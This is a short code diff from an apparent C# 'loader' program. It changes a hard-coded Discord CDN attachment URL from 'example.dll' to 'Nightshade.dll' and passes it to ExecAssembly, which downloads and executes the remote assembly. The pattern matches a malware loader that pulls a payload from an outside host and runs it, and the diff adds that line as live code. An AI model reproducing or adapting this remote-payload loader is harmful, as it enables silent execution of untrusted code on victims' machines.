@@ -85,7 +85,7 @@ namespace loader {
             // string dllEntryName = "Test";
             // DllLoader(remoteDllUrl, localDllName, dllEntryName);
 
-            string assembly = "https://cdn.discordapp.com/attachments/804752207312322571/947621052064890890/example.dll";
+            string assembly = "https://cdn.discordapp.com/attachments/804752207312322571/99391886675736656/Nightshade.dll";
             ExecAssembly(assembly);
         }
     }
